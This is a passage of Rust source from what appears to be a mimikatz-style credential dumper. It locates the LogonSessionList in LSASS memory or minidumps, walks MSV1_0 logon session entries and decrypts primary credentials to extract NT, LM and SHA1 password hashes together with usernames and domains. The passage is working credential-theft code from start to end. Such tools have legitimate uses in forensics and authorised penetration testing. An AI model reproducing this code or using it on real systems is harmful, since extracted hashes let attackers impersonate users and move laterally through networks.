        current = match read_ptr(vmem, current + offsets.flink, arch) {
            Ok(f) => f,
            Err(_) => break,
        };
    }

    results
}

/// Scan an entry's memory for a pointer to KIWI_MSV1_0_PRIMARY_CREDENTIALS.
/// Identified by the "Primary" ANSI_STRING at offset +0x08 in the target structure.
fn find_credentials_ptr_in_entry(vmem: &dyn VirtualMemory, entry_addr: u64, arch: Arch) -> Option<u64> {
    // Scan pointer-aligned offsets for heap pointers.
    // Range extended to 0x400 to cover Win10 19041+ builds where pCredentials
    // can be at entry+0x2a0..0x2b0 (beyond the original 0x220 ceiling).
    let step = arch.ptr_size() as usize;
    let scan_start = if arch == Arch::X64 { 0x80 } else { 0x40 };
    let scan_end = if arch == Arch::X64 { 0x400 } else { 0x200 };
    let mut heap_ptrs_found = 0;
    for off in (scan_start..scan_end).step_by(step) {
        let ptr = match read_ptr(vmem, entry_addr + off as u64, arch) {
            Ok(p) => p,
            Err(_) => continue,
        };
        if !is_valid_user_ptr(ptr, arch) {
            continue;
        }
        heap_ptrs_found += 1;
        // Direct check: does this point to KIWI_MSV1_0_PRIMARY_CREDENTIALS?
        if is_primary_credentials_struct(vmem, ptr, arch) {
            log::info!(
                "  Auto-detected pCredentials at entry+0x{:x} -> 0x{:x}",
                off,
                ptr
            );
            return Some(ptr);
        }
    }
    // Second pass: try one level of indirection (entry -> intermediate -> Primary)
    for off in (scan_start..scan_end).step_by(step) {
        let ptr = match read_ptr(vmem, entry_addr + off as u64, arch) {
            Ok(p) => p,
            Err(_) => continue,
        };
        if !is_valid_user_ptr(ptr, arch) {
            continue;
        }
        // Check first few pointer-sized fields in the target struct
        for inner_off in (0..0x40usize).step_by(step) {
            let inner_ptr = match read_ptr(vmem, ptr + inner_off as u64, arch) {
                Ok(p) => p,
                Err(_) => continue,
            };
            if !is_valid_user_ptr(inner_ptr, arch) {
                continue;
            }
            if is_primary_credentials_struct(vmem, inner_ptr, arch) {
                log::info!(
                    "  Auto-detected pCredentials (indirect) at entry+0x{:x} -> 0x{:x} +0x{:x} -> 0x{:x}",
                    off, ptr, inner_off, inner_ptr
                );
                return Some(inner_ptr);
            }
        }
    }
    // Third pass: direct inline scan — the credentials struct may be embedded
    // within the session entry itself (no pointer indirection). Search entry bytes
    // for ANSI_STRING signatures at pointer-aligned offsets:
    //   "Primary":        Length=7,  MaxLength=8  → 07 00 08 00
    //   "CredentialKeys": Length=14, MaxLength=15 → 0E 00 0F 00
    let inline_scan_size = scan_end;
    if let Ok(entry_data) = vmem.read_virt_bytes(entry_addr, inline_scan_size) {
        for off in (0x28..inline_scan_size.saturating_sub(0x28)).step_by(step) {
            if off + 3 >= entry_data.len() {
                continue;
            }
            let is_primary_sig = entry_data[off] == 0x07
                && entry_data[off + 1] == 0x00
                && entry_data[off + 2] == 0x08
                && entry_data[off + 3] == 0x00;
            let is_credkeys_sig = entry_data[off] == 0x0E
                && entry_data[off + 1] == 0x00
                && entry_data[off + 2] == 0x0F
                && entry_data[off + 3] == 0x00;
            if !is_primary_sig && !is_credkeys_sig {
                continue;
            }
            // The KIWI_MSV1_0_PRIMARY_CREDENTIALS starts ptr_size bytes before the ANSI_STRING
            let struct_off = off - step;
            let struct_addr = entry_addr + struct_off as u64;

            if is_primary_credentials_struct(vmem, struct_addr, arch) {
                log::info!(
                    "  Found inline {} credentials at entry+0x{:x} (0x{:x})",
                    if is_primary_sig { "Primary" } else { "CredentialKeys" },
                    struct_off,
                    struct_addr
                );
                return Some(struct_addr);
            }
        }
    }
    log::debug!(
        "  No Primary credentials found in entry 0x{:x} ({} heap ptrs scanned)",
        entry_addr,
        heap_ptrs_found
    );
    None
}

/// Check if a pointer leads to a KIWI_MSV1_0_PRIMARY_CREDENTIALS structure.
///
/// Layout (arch-dependent):
///   +0x00: next (PVOID: 8B x64 / 4B x86)
///   +ps:   Primary (ANSI_STRING: 16B x64 / 8B x86)
///   +ps+us: Credentials (UNICODE_STRING: encrypted data)
///
/// Where ps=ptr_size, us=ustr_size, sb=str_buf_off (offset from string start to Buffer field).
///
/// Accepts both "Primary" (len=7) and "CredentialKeys" (len=14) ANSI_STRING names,
/// as both are valid KIWI_MSV1_0_PRIMARY_CREDENTIALS entries chained via `next`.
fn is_primary_credentials_struct(vmem: &dyn VirtualMemory, ptr: u64, arch: Arch) -> bool {
    let ps = arch.ptr_size();
    let us = arch.ustr_size();
    let sb = if arch == Arch::X64 { 8u64 } else { 4 }; // offset within ANSI/UNICODE_STRING to Buffer

    // Check ANSI_STRING Primary: Length should be 7 ("Primary") or 14 ("CredentialKeys")
    let length = match vmem.read_virt_u16(ptr + ps) {
        Ok(l) => l,
        Err(_) => return false,
    };
    let max_length = match vmem.read_virt_u16(ptr + ps + 2) {
        Ok(l) => l,
        Err(_) => return false,
    };
    if (length != 7 && length != 14) || !(length..=64).contains(&max_length) {
        return false;
    }
    // Read the buffer pointer
    let buf_ptr = match read_ptr(vmem, ptr + ps + sb, arch) {
        Ok(p) => p,
        Err(_) => return false,
    };
    if !is_valid_user_ptr(buf_ptr, arch) {
        return false;
    }
    // Try to verify the ANSI string content (may fail if paged out)
    let string_ok = match vmem.read_virt_bytes(buf_ptr, length as usize) {
        Ok(data) => {
            (length == 7 && data == b"Primary")
                || (length == 14 && data == b"CredentialKeys")
        }
        Err(_) => false,
    };
    if string_ok {
        return true;
    }
    // Fallback: check structural properties even if the ANSI string is paged out
    let cred_off = ps + us; // Credentials UNICODE_STRING offset
    let cred_len = match vmem.read_virt_u16(ptr + cred_off) {
        Ok(l) => l as usize,
        Err(_) => return false,
    };
    let cred_max_len = match vmem.read_virt_u16(ptr + cred_off + 2) {
        Ok(l) => l as usize,
        Err(_) => return false,
    };
    let cred_buf = match read_ptr(vmem, ptr + cred_off + sb, arch) {
        Ok(p) => p,
        Err(_) => return false,
    };
    if cred_len == 0 || cred_len > 0x200 || cred_max_len < cred_len {
        return false;
    }
    if !is_valid_user_ptr(cred_buf, arch) {
        return false;
    }
    // Additional check: next pointer at +0x00 should be either 0 or a valid pointer
    let next = read_ptr(vmem, ptr, arch).unwrap_or(1);
    if next != 0 && !is_valid_user_ptr(next, arch) {
        return false;
    }
    log::debug!(
        "  Structural match for Primary credentials at 0x{:x}: ANSI(len={},max={}), UNICODE(len={},max={},buf=0x{:x})",
        ptr, length, max_length, cred_len, cred_max_len, cred_buf
    );
    true
}

/// Read the ANSI_STRING name from a KIWI_MSV1_0_PRIMARY_CREDENTIALS struct.
/// Returns the name string (e.g. "Primary", "CredentialKeys") or None if unreadable.
fn read_primary_credentials_name(vmem: &dyn VirtualMemory, ptr: u64, arch: Arch) -> Option<String> {
    let ps = arch.ptr_size();
    let sb = if arch == Arch::X64 { 8u64 } else { 4 };

    let length = vmem.read_virt_u16(ptr + ps).ok()? as usize;
    if length == 0 || length > 64 {
        return None;
    }
    let buf_ptr = read_ptr(vmem, ptr + ps + sb, arch).ok()?;
    if !is_valid_user_ptr(buf_ptr, arch) {
        return None;
    }
    let data = vmem.read_virt_bytes(buf_ptr, length).ok()?;
    String::from_utf8(data).ok()
}

/// Walk the `next` chain on a KIWI_MSV1_0_PRIMARY_CREDENTIALS linked list,
/// returning the first entry whose ANSI_STRING name is "Primary".
/// Logs and skips "CredentialKeys" entries (DPAPI key material, not NT/LM hashes).
fn find_primary_entry_in_chain(vmem: &dyn VirtualMemory, first_ptr: u64, arch: Arch) -> Option<u64> {
    let mut current = first_ptr;
    let mut visited = std::collections::HashSet::new();

    while current != 0 && !visited.contains(&current) {
        visited.insert(current);

        if !is_primary_credentials_struct(vmem, current, arch) {
            break;
        }

        match read_primary_credentials_name(vmem, current, arch) {
            Some(name) if name == "Primary" => {
                return Some(current);
            }
            Some(name) if name == "CredentialKeys" => {
                log::info!(
                    "  Skipping CredentialKeys entry at 0x{:x} (DPAPI key material)",
                    current
                );
            }
            Some(name) => {
                log::debug!(
                    "  Skipping unknown credential entry '{}' at 0x{:x}",
                    name,
                    current
                );
            }
            None => {
                // Name unreadable but struct passed validation — could be "Primary" with paged-out name.
                // Fall back to original behavior: assume it's Primary.
                log::debug!(
                    "  Credential entry at 0x{:x} has unreadable name, assuming Primary",
                    current
                );
                return Some(current);
            }
        }

        // Follow the `next` pointer at offset 0x00
        current = match read_ptr(vmem, current, arch) {
            Ok(p) => p,
            Err(_) => break,
        };
    }

    None
}

/// Scan the .data section of a DLL for ALL topology-valid LIST_ENTRY heads.
/// Works for both msv1_0.dll and lsasrv.dll with arch-aware pointer widths.
fn find_all_logon_session_list_candidates(
    vmem: &dyn VirtualMemory,
    pe: &PeHeaders,
    dll_base: u64,
    arch: Arch,
) -> Result<Vec<u64>> {
    let data_sec = pe.find_section(".data").ok_or_else(|| {
        crate::error::VmkatzError::PatternNotFound(".data section in DLL".to_string())
    })?;

    let data_base = dll_base + data_sec.virtual_address as u64;
    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
    let data = vmem.read_virt_bytes(data_base, data_size)?;

    let ptr_size = arch.ptr_size() as usize;
    let list_entry_size = ptr_size * 2; // flink + blink

    log::info!(
        "Scanning DLL .data for LIST_ENTRY heads: base=0x{:x} size=0x{:x} arch={:?}",
        data_base,
        data_size,
        arch
    );

    let read_ptr_at = |data: &[u8], off: usize| -> u64 {
        if arch == Arch::X64 {
            super::types::read_u64_le(data, off).unwrap_or(0)
        } else {
            super::types::read_u32_le(data, off).unwrap_or(0) as u64
        }
    };

    let mut candidates = Vec::new();

    for off in (0..data_size.saturating_sub(list_entry_size)).step_by(ptr_size) {
        let flink = read_ptr_at(&data, off);
        let blink = read_ptr_at(&data, off + ptr_size);

        if !is_valid_user_ptr(flink, arch) || !is_valid_user_ptr(blink, arch) {
            continue;
        }
        if flink >= dll_base && flink < dll_base + 0x100000 {
            continue;
        }

        let list_addr = data_base + off as u64;
        let entry_addr = flink;

        let entry_flink = match read_ptr(vmem, entry_addr, arch) {
            Ok(f) => f,
            Err(_) => continue,
        };
        let entry_blink = match read_ptr(vmem, entry_addr + ptr_size as u64, arch) {
            Ok(b) => b,
            Err(_) => continue,
        };
        if entry_blink != list_addr {
            continue;
        }
        if entry_flink != list_addr && !is_valid_user_ptr(entry_flink, arch) {
            continue;
        }

        log::debug!(
            "Data scan topology-valid candidate at 0x{:x} (data+0x{:x}): flink=0x{:x} entry_flink=0x{:x}",
            list_addr, off, flink, entry_flink
        );
        candidates.push(list_addr);
    }

    log::info!(
        "Data scan: {} topology-valid candidates (arch={:?})",
        candidates.len(), arch
    );
    Ok(candidates)
}

/// Search the .data section for an inline LogonSessionList hash table.
/// The hash table is an array of LIST_ENTRY (16 bytes each) where:
///   - Empty buckets have Flink=Blink=&self (self-referencing .data address)
///   - Non-empty buckets have Flink pointing to first MSV1_0_LIST entry (heap)
///     Returns: list of (bucket_addr, bucket_count) for potential hash tables found.
fn find_inline_hash_table(
    vmem: &dyn VirtualMemory,
    pe: &PeHeaders,
    msv_base: u64,
    arch: Arch,
) -> Result<Vec<(u64, usize)>> {
    use super::types::read_ptr_from_buf;
    let msv_end = msv_base + 0x100000; // Upper bound of DLL image
    let data_sec = pe.find_section(".data").ok_or_else(|| {
        crate::error::VmkatzError::PatternNotFound(".data section in msv1_0.dll".to_string())
    })?;

    let data_base = msv_base + data_sec.virtual_address as u64;
    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
    let data = vmem.read_virt_bytes(data_base, data_size)?;

    let mut tables = Vec::new();
    let mut run_start: Option<usize> = None;
    let mut run_count = 0usize;
    let bucket_step = arch.list_entry_size() as usize;
    let ptr_size = arch.ptr_size() as usize;

    // Scan for consecutive LIST_ENTRY entries that form a valid hash table
    for off in (0..data_size.saturating_sub(bucket_step)).step_by(bucket_step) {
        let flink = read_ptr_from_buf(&data, off, arch);
        let blink = read_ptr_from_buf(&data, off + ptr_size, arch);
        let self_addr = data_base + off as u64;

        // A valid hash table bucket has:
        // - Flink/Blink self-referencing (empty bucket), OR
        // - Flink/Blink pointing to valid user-mode entries (not within the DLL image itself)
        let flink_is_self = flink == self_addr;
        let blink_is_self = blink == self_addr;
        let flink_is_dll = flink >= msv_base && flink < msv_end;
        let blink_is_dll = blink >= msv_base && blink < msv_end && !blink_is_self;

        let is_valid_bucket = (flink_is_self && blink_is_self) // Empty bucket
            || (is_valid_user_ptr(flink, arch) && !flink_is_dll && (blink_is_self || (is_valid_user_ptr(blink, arch) && !blink_is_dll))); // Non-empty bucket

        if is_valid_bucket {
            if run_start.is_none() {
                run_start = Some(off);
            }
            run_count += 1;
        } else {
            if let Some(start) = run_start.filter(|_| run_count >= 5) {
                let table_addr = data_base + start as u64;
                log::info!(
                    "Found inline hash table at 0x{:x} (data+0x{:x}): {} buckets",
                    table_addr,
                    start,
                    run_count
                );
                tables.push((table_addr, run_count));
            }
            run_start = None;
            run_count = 0;
        }
    }
    // Check final run
    if let Some(start) = run_start.filter(|_| run_count >= 5) {
        let table_addr = data_base + start as u64;
        log::info!(
            "Found inline hash table at 0x{:x} (data+0x{:x}): {} buckets",
            table_addr,
            start,
            run_count
        );
        tables.push((table_addr, run_count));
    }

    Ok(tables)
}

/// Walk all buckets in a hash table and extract MSV credentials from MSV1_0_LIST entries.
fn walk_hash_table(
    vmem: &dyn VirtualMemory,
    table_addr: u64,
    bucket_count: usize,
    offsets: &MsvOffsets,
    keys: &CryptoKeys,
    arch: Arch,
) -> Vec<(u64, MsvCredential)> {
    let mut results = Vec::new();
    let mut validated_variant: Option<usize> = None;
    let mut non_empty = 0;

    let bucket_size = arch.list_entry_size();
    for bucket_idx in 0..bucket_count {
        let bucket_addr = table_addr + (bucket_idx as u64) * bucket_size;
        let flink = match read_ptr(vmem, bucket_addr, arch) {
            Ok(f) => f,
            Err(_) => continue,
        };

        // Skip empty buckets (self-referencing)
        if flink == bucket_addr || flink == 0 {
            continue;
        }
        non_empty += 1;
        log::debug!(
            "Hash table 0x{:x} bucket {}: flink=0x{:x} (non-empty)",
            table_addr,
            bucket_idx,
            flink
        );

        // Walk the chain for this bucket
        let mut current = flink;
        let mut visited = std::collections::HashSet::new();

        loop {
            if current == bucket_addr || visited.contains(&current) || current == 0 {
                break;
            }
            visited.insert(current);

            let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
            let username = read_ustring(vmem, current + offsets.username, arch).unwrap_or_default();
            let domain = read_ustring(vmem, current + offsets.domain, arch).unwrap_or_default();

            // Get credentials pointer (known offset or auto-detect)
            let cred_ptr = if offsets.credentials_ptr > 0 {
                let ptr = read_ptr(vmem, current + offsets.credentials_ptr, arch).unwrap_or(0);
                if ptr != 0 && is_valid_user_ptr(ptr, arch) && is_primary_credentials_struct(vmem, ptr, arch) {
                    Some(ptr)
                } else {
                    find_credentials_ptr_in_entry(vmem, current, arch)
                }
            } else {
                find_credentials_ptr_in_entry(vmem, current, arch)
            };

            // Walk the PRIMARY_CREDENTIALS linked list to find the "Primary" entry,
            // skipping "CredentialKeys" (DPAPI key material) entries.
            let primary_ptr = cred_ptr.and_then(|p| find_primary_entry_in_chain(vmem, p, arch));

            if let Some(primary_ptr) = primary_ptr {
                if !username.is_empty() {
                    if let Ok(cred) = extract_primary_credential(
                        vmem,
                        primary_ptr,
                        keys,
                        &mut validated_variant,
                        arch,
                    ) {
                        log::info!(
                            "MSV credential (hash table bucket {}): LUID=0x{:x} user={} domain={} NT={}",
                            bucket_idx, luid, username, domain, hex::encode(cred.nt_hash)
                        );
                        results.push((
                            luid,
                            MsvCredential {
                                username: username.clone(),
                                domain: domain.clone(),
                                lm_hash: cred.lm_hash,
                                nt_hash: cred.nt_hash,
                                sha1_hash: cred.sha1_hash,
                            },
                        ));
                    }
                }
            } else if !username.is_empty() {
                log::info!(
                    "MSV entry (credentials paged out): bucket={} LUID=0x{:x} user={} domain={}",
                    bucket_idx,
                    luid,
                    username,
                    domain
                );
            }

            current = match read_ptr(vmem, current + offsets.flink, arch) {
                Ok(f) => f,
                Err(_) => break,
            };
        }
    }

    if non_empty > 0 && results.is_empty() {
        log::debug!(
            "Hash table 0x{:x}: {} non-empty buckets, 0 credentials extracted (variant luid=0x{:x})",
            table_addr, non_empty, offsets.luid
        );
    }

    results
}

use crate::lsass::patterns::is_heap_ptr;

/// Find LogonSessionList and LogonSessionListCount from pattern.
/// Returns (list_addr, bucket_count). After the pattern, mimikatz resolves
/// two LEA instructions: one for the list (array of LIST_ENTRY heads) and
/// one for the count (DWORD). We find all LEAs and identify which is which.
fn find_list_addr_and_count(vmem: &dyn VirtualMemory, pattern_addr: u64) -> Result<(u64, usize)> {
    let data = vmem.read_virt_bytes(pattern_addr, 0x80)?;
    let mut lea_addrs = Vec::new();

    let mut i = 0;
    while i < data.len().saturating_sub(6) {
        let is_lea = (data[i] == 0x48
            && data[i + 1] == 0x8D
            && (data[i + 2] == 0x0D || data[i + 2] == 0x15))
            || (data[i] == 0x4C && data[i + 1] == 0x8D && data[i + 2] == 0x05)
            || (data[i] == 0x4C && data[i + 1] == 0x8D && data[i + 2] == 0x0D);
        if is_lea {
            if let Ok(addr) = patterns::resolve_rip_relative(vmem, pattern_addr + i as u64, 3) {
                lea_addrs.push(addr);
            }
            i += 7; // Skip past this LEA
        } else {
            i += 1;
        }
    }

    if lea_addrs.is_empty() {
        return Err(crate::error::VmkatzError::PatternNotFound(
            "LEA for LogonSessionList".to_string(),
        ));
    }

    // Identify which LEA is the count (DWORD) and which is the list (pointer array).
    // The count is a small DWORD (typically 64). The list contains LIST_ENTRY heads.
    let mut list_addr = None;
    let mut count = 0usize;

    for &addr in &lea_addrs {
        let val = vmem.read_virt_u32(addr).unwrap_or(0);
        // LogonSessionListCount is typically 64 or another small power-of-2
        if (4..=256).contains(&val) {
            count = val as usize;
            log::info!("LogonSessionListCount at 0x{:x} = {}", addr, val);
        } else {
            // Check if it looks like a LIST_ENTRY head (Flink should be a heap or self ptr)
            let flink = vmem.read_virt_u64(addr).unwrap_or(0);
            if flink != 0 && (is_heap_ptr(flink) || flink == addr) {
                list_addr = Some(addr);
                log::info!("LogonSessionList at 0x{:x} (flink=0x{:x})", addr, flink);
            }
        }
    }

    let list = list_addr.ok_or_else(|| {
        crate::error::VmkatzError::PatternNotFound("LogonSessionList address".to_string())
    })?;

    if count == 0 {
        count = 1; // Fallback: treat as single list head
    }

    Ok((list, count))
}

fn find_list_addr(vmem: &dyn VirtualMemory, pattern_addr: u64) -> Result<u64> {
    find_list_addr_and_count(vmem, pattern_addr).map(|(addr, _)| addr)
}

/// Result of extracting primary credentials (NTLM hashes).
pub struct RawPrimaryCred {
    pub lm_hash: [u8; 16],
    pub nt_hash: [u8; 16],
    pub sha1_hash: [u8; 20],
}

/// Scan all memory regions for KIWI_MSV1_0_PRIMARY_CREDENTIALS structures.
/// This is the VirtualMemory equivalent of `scan_phys_for_msv_credentials` in finder.rs.
/// Used as a fallback for minidumps when the standard MSV list walk fails.
pub fn scan_vmem_for_msv_credentials(
    vmem: &dyn VirtualMemory,
    regions: &[(u64, u64)],
    keys: &CryptoKeys,
    arch: Arch,
) -> Vec<(u64, MsvCredential)> {
    let mut results = Vec::new();
    let mut validated_variant: Option<usize> = None;
    let mut candidates_found = 0u64;
    let mut regions_scanned = 0u64;

    // ANSI_STRING "Primary" starts at ptr_size offset from struct base
    let ps = arch.ptr_size() as usize;
    let align = ps; // alignment: 8 on x64, 4 on x86

    log::info!(
        "MSV vmem-scan: searching {} memory regions for Primary credential structures (arch={:?})...",
        regions.len(), arch
    );

    for &(region_va, region_size) in regions {
        let chunk_size = 0x10000usize; // 64KB
        let mut offset = 0u64;

        while offset < region_size {
            let read_size = std::cmp::min(chunk_size as u64, region_size - offset) as usize;
            if read_size < 0x28 {
                break;
            }

            let chunk_va = region_va + offset;
            let data = match vmem.read_virt_bytes(chunk_va, read_size) {
                Ok(d) => d,
                Err(_) => {
                    offset += chunk_size as u64;
                    continue;
                }
            };

            if data.iter().all(|&b| b == 0) {
                offset += chunk_size as u64;
                continue;
            }

            // Scan for ANSI_STRING signatures at offset ps (ptr_size) from struct start:
            //   "Primary":        Length=7  (0x0007), MaxLength=8  (0x0008)
            //   "CredentialKeys": Length=14 (0x000E), MaxLength=15 (0x000F)
            for scan_off in (0..read_size.saturating_sub(0x28)).step_by(align) {
                let is_primary_sig = data[scan_off] == 0x07
                    && data[scan_off + 1] == 0x00
                    && data[scan_off + 2] == 0x08
                    && data[scan_off + 3] == 0x00;
                let is_credkeys_sig = data[scan_off] == 0x0E
                    && data[scan_off + 1] == 0x00
                    && data[scan_off + 2] == 0x0F
                    && data[scan_off + 3] == 0x00;
                if !is_primary_sig && !is_credkeys_sig {
                    continue;
                }

                // struct starts ps bytes before the ANSI_STRING
                if scan_off < ps {
                    continue;
                }
                let struct_off = scan_off - ps;
                let struct_va = chunk_va + struct_off as u64;

                if !is_primary_credentials_struct(vmem, struct_va, arch) {
                    continue;
                }

                // Walk the PRIMARY_CREDENTIALS chain to find the "Primary" entry,
                // skipping "CredentialKeys" entries.
                let primary_va = match find_primary_entry_in_chain(vmem, struct_va, arch) {
                    Some(va) => va,
                    None => continue,
                };

                candidates_found += 1;
                log::info!(
                    "MSV vmem-scan: Primary credential candidate at VA 0x{:x}",
                    primary_va
                );

                match extract_primary_credential(vmem, primary_va, keys, &mut validated_variant, arch) {
                    Ok(cred) => {
                        if looks_like_hash(&cred.nt_hash) || looks_like_hash(&cred.lm_hash) {
                            let (username, domain) =
                                extract_username_from_cred_blob(vmem, primary_va, keys, arch);
                            log::info!(
                                "MSV vmem-scan: extracted credential at 0x{:x}: user='{}' domain='{}' NT={}",
                                primary_va, username, domain, hex::encode(cred.nt_hash)
                            );
                            let msv_cred = MsvCredential {
                                username,
                                domain,
                                nt_hash: cred.nt_hash,
                                lm_hash: cred.lm_hash,
                                sha1_hash: cred.sha1_hash,
                            };
                            results.push((0, msv_cred));
                        }
                    }
                    Err(e) => {
                        log::debug!(
                            "MSV vmem-scan: extraction failed at 0x{:x}: {}",
                            primary_va, e
                        );
                    }
                }
            }

            offset += (chunk_size - 0x28) as u64;
            regions_scanned += 1;
        }
    }

    log::info!(
        "MSV vmem-scan: {} regions scanned, {} candidates, {} credentials extracted",
        regions_scanned, candidates_found, results.len()
    );
    results
}

/// Extract username and domain from a KIWI_MSV1_0_PRIMARY_CREDENTIALS structure.
///
/// The encrypted blob (UNICODE_STRING at Credentials field) decrypts to:
///   +0x00: LogonDomainName (UNICODE_STRING: arch-dependent size)
///   +ustr_size: UserName (UNICODE_STRING: arch-dependent size)
/// Buffer fields are offsets into the decrypted blob, or VAs in LSASS memory.
pub(crate) fn extract_username_from_cred_blob(
    vmem: &dyn VirtualMemory,
    cred_struct_ptr: u64,
    keys: &CryptoKeys,
    arch: Arch,
) -> (String, String) {
    let ps = arch.ptr_size();
    let us = arch.ustr_size();
    let sb = if arch == Arch::X64 { 8u64 } else { 4 };
    let cred_len_off = ps + us;      // Credentials.Length offset in wrapper struct
    let cred_buf_off = cred_len_off + sb; // Credentials.Buffer offset

    let enc_size = match vmem.read_virt_u16(cred_struct_ptr + cred_len_off) {
        Ok(s) => s as usize,
        Err(_) => return (String::new(), String::new()),
    };
    if enc_size == 0 || enc_size > 0x400 {
        return (String::new(), String::new());
    }
    let enc_ptr = match read_ptr(vmem, cred_struct_ptr + cred_buf_off, arch) {
        Ok(p) if is_valid_user_ptr(p, arch) => p,
        _ => return (String::new(), String::new()),
    };
    let enc_data = match vmem.read_virt_bytes(enc_ptr, enc_size) {
        Ok(d) => d,
        Err(_) => return (String::new(), String::new()),
    };
    let decrypted = match crate::lsass::crypto::decrypt_credential(keys, &enc_data) {
        Ok(d) => d,
        Err(_) => return (String::new(), String::new()),
    };

    // Decrypted blob has UNICODE_STRINGs with arch-specific size
    let min_size = (us * 2) as usize;
    if decrypted.len() < min_size {
        return (String::new(), String::new());
    }

    let domain_len = u16::from_le_bytes([decrypted[0], decrypted[1]]) as usize;
    let user_off = us as usize;
    let user_len = u16::from_le_bytes([decrypted[user_off], decrypted[user_off + 1]]) as usize;

    let domain_buf_raw = read_blob_ptr(&decrypted, sb as usize, arch);
    let user_buf_raw = read_blob_ptr(&decrypted, user_off + sb as usize, arch);

    let domain = read_blob_unicode_string(vmem, &decrypted, domain_buf_raw, domain_len, arch);
    let username = read_blob_unicode_string(vmem, &decrypted, user_buf_raw, user_len, arch);

    (username, domain)
}

/// Read a pointer from a decrypted blob at the given offset.
fn read_blob_ptr(blob: &[u8], off: usize, arch: Arch) -> u64 {
    if arch == Arch::X64 {
        if off + 8 <= blob.len() {
            u64::from_le_bytes(blob[off..off + 8].try_into().unwrap_or([0; 8]))
        } else {
            0
        }
    } else if off + 4 <= blob.len() {
        u32::from_le_bytes(blob[off..off + 4].try_into().unwrap_or([0; 4])) as u64
    } else {
        0
    }
}

/// Read a UNICODE_STRING from a decrypted blob.
/// Buffer can be either an offset into the blob or a VA in LSASS memory.
fn read_blob_unicode_string(
    vmem: &dyn VirtualMemory,
    blob: &[u8],
    buf_raw: u64,
    byte_len: usize,
    arch: Arch,
) -> String {
    if byte_len == 0 || byte_len > 0x200 {
        return String::new();
    }
    // Try as offset into the blob first
    let buf_off = buf_raw as usize;
    if buf_off + byte_len <= blob.len() {
        let data = &blob[buf_off..buf_off + byte_len];
        return crate::utils::utf16le_decode(data);
    }
    // Otherwise treat as VA in LSASS memory
    if is_valid_user_ptr(buf_raw, arch) {
        return vmem
            .read_win_unicode_string_raw(buf_raw, byte_len)
            .unwrap_or_default();
    }
    String::new()
}

/// Public wrapper for extracting primary credentials from a KIWI_MSV1_0_PRIMARY_CREDENTIALS pointer.
/// `validated_variant` tracks which PRIMARY_CRED_OFFSET_VARIANT was SHA1-validated for a prior
/// credential in the same LSASS process. All credentials share the same Windows build → same variant.
pub fn try_extract_primary_credential(
    vmem: &dyn VirtualMemory,
    cred_ptr: u64,
    keys: &CryptoKeys,
    validated_variant: &mut Option<usize>,
    arch: Arch,
) -> Result<RawPrimaryCred> {
    extract_primary_credential(vmem, cred_ptr, keys, validated_variant, arch)
}

fn extract_primary_credential(
    vmem: &dyn VirtualMemory,
    cred_ptr: u64,
    keys: &CryptoKeys,
    validated_variant: &mut Option<usize>,
    arch: Arch,
) -> Result<RawPrimaryCred> {
    // KIWI_MSV1_0_PRIMARY_CREDENTIALS layout:
    //   +0x00: next (PVOID)
    //   +ps:   Primary (ANSI_STRING)
    //   +ps+us: Credentials (UNICODE_STRING: encrypted credential data)
    let ps = arch.ptr_size();
    let us = arch.ustr_size();
    let sb = if arch == Arch::X64 { 8u64 } else { 4 };
    let cred_len_off = ps + us;
    let cred_buf_off = cred_len_off + sb;

    let enc_size = vmem.read_virt_u16(cred_ptr + cred_len_off)? as usize;

    if enc_size == 0 || enc_size > 0x200 {
        log::info!("  Invalid enc_size {}, trying direct read", enc_size);
        return Err(crate::error::VmkatzError::DecryptionError(format!(
            "Invalid encrypted credential size: {}",
            enc_size
        )));
    }

    let enc_data_ptr = read_ptr(vmem, cred_ptr + cred_buf_off, arch)?;
    if enc_data_ptr == 0 {
        return Err(crate::error::VmkatzError::DecryptionError(
            "Null encrypted data pointer".to_string(),
        ));
    }

    let enc_data = vmem.read_virt_bytes(enc_data_ptr, enc_size)?;
    let decrypted = crate::lsass::crypto::decrypt_credential(keys, &enc_data)?;

    // Try each offset variant and pick the one that makes sense.
    // Validation strategy (ranked by confidence):
    //   0. Previously SHA1-validated variant → reuse (same LSASS → same Windows build)
    //   1. SHA1(NT) == SHA1 field → strongest confirmation, accept immediately
    //   2. Structural flag validation + entropy → strong (checks isNtOwf boolean flags)
    //   3. NT passes entropy → fallback, take first passing variant
    //   4. If no variant passes, return error (don't guess)
    //
    // Key insight: ShaOwPassword stores SHA1(UTF16LE(password)) for human accounts,
    // NOT SHA1(NTHash). So SHA1 validation only works for machine accounts (where the
    // "password" IS the NT hash bytes). For human accounts we rely on the validated
    // variant from a prior machine-account credential, or structural analysis.

    // Phase 0: If we already SHA1-validated a variant for a prior credential, reuse it.
    // All credentials in the same LSASS process use the same Windows build → same offsets.
    if let Some(vi) = *validated_variant {
        let offsets = &PRIMARY_CRED_OFFSET_VARIANTS[vi];
        let nt_off = offsets.nt_hash;
        let lm_off = offsets.lm_hash;
        let sha1_off = offsets.sha1_hash;

        if decrypted.len() >= sha1_off + 20 {
            let mut nt_hash = [0u8; 16];
            let mut lm_hash = [0u8; 16];
            let mut sha1_hash = [0u8; 20];
            nt_hash.copy_from_slice(&decrypted[nt_off..nt_off + 16]);
            lm_hash.copy_from_slice(&decrypted[lm_off..lm_off + 16]);
            sha1_hash.copy_from_slice(&decrypted[sha1_off..sha1_off + 20]);

            if nt_hash != [0u8; 16] && looks_like_hash(&nt_hash)
                && (lm_hash == [0u8; 16] || lm_hash != nt_hash)
            {
                // Use SHA1 from blob directly (ShaOwPassword). For human accounts
                // this is SHA1(UTF16LE(password)), not SHA1(NT_hash). Only compute
                // SHA1(NT) as fallback if the blob's sha1 field is zeroed.
                let final_sha1 = if sha1_hash == [0u8; 20] {
                    sha1_digest(&nt_hash)
                } else {
                    sha1_hash
                };
                log::info!(
                    "  Using previously validated variant {} (nt=0x{:x}) for this credential",
                    vi, offsets.nt_hash
                );
                return Ok(RawPrimaryCred {
                    lm_hash,
                    nt_hash,
                    sha1_hash: final_sha1,
                });
            }
        }
    }

    let mut best_result: Option<RawPrimaryCred> = None;
    // Entropy candidates: (variant_index, struct_score, cred)
    let mut entropy_candidates: Vec<(usize, u32, RawPrimaryCred)> = Vec::new();

    for (vi, offsets) in PRIMARY_CRED_OFFSET_VARIANTS.iter().enumerate() {
        let nt_off = offsets.nt_hash;
        let lm_off = offsets.lm_hash;
        let sha1_off = offsets.sha1_hash;

